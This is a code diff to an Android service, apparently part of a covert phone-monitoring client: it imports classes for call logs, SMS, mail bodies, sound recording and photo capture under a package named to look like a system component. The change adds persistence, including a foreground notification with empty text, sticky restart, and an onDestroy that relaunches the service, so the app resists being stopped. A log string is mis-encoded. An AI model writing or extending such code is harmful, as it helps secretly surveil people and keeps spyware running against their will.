@@ -3,6 +3,7 @@ package com.android.service;
 import org.json.JSONObject;
 
 import android.app.AlarmManager;
+import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.BroadcastReceiver;
@@ -22,6 +23,7 @@ import com.android.db.CallConten;
 import com.android.db.PhoneMailBody;
 import com.android.db.SMSConten;
 import com.android.db.SqlUtils;
+import com.android.smsclient.R;
 import com.android.sound.SoundRecord;
 import com.android.sound.TakePhoto;
 import com.android.utils.LogUtils;
@@ -72,13 +74,32 @@ public class ClientService extends Service {
 		regfilter();
 		LogUtils.write(TAG, "·ÀÐÝÃßÆô¶¯");
 		acquireWakeLock();
+		
+		
+		Notification notification = new Notification(R.drawable.nt,"", System.currentTimeMillis());
+
+		PendingIntent pendingintent = PendingIntent.getService(this, 0,new Intent(this, ClientService.class), 0);
+		notification.setLatestEventInfo(this, "", "", pendingintent);
+		startForeground(0x111, notification);
+	}
+	
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId) {
+		// TODO Auto-generated method stub
+		flags = START_STICKY;
+		return super.onStartCommand(intent, flags, startId);
 	}
 	
 	@Override
 	public void onDestroy() {
 		// TODO Auto-generated method stub
+		Intent destroy = new Intent("clientservice.destroy");  
+		sendBroadcast(destroy);  
 		super.onDestroy();
 		this.unregisterReceiver(receiver);
+		stopForeground(true);
+		Intent intent=new Intent(this,ClientService.class);
+		startService(intent);
 	}
 
 	public void TeleInit() {
